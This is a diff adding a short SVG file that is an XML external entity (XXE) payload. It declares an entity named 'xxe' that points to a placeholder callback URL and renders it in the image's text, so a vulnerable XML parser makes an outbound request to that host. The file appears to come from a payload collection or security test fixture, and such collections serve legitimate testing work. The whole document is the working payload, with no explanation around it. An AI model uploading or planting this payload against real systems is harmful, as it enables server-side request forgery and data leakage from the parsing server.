@@ -1,0 +1,5 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "http://CALLBACK_URL"> ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
